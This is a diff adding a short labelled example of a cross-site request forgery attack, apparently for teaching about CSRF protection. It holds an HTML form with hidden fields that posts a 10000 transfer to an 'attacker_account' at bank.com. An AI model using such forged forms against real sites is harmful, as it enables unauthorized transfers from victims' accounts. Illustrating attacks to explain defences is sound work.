@@ -1,0 +1,7 @@
+// Example Attack without CSRF protection
+
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="10000">
+  <input type="hidden" name="to" value="attacker_account">
+  <input type="submit">
+</form>
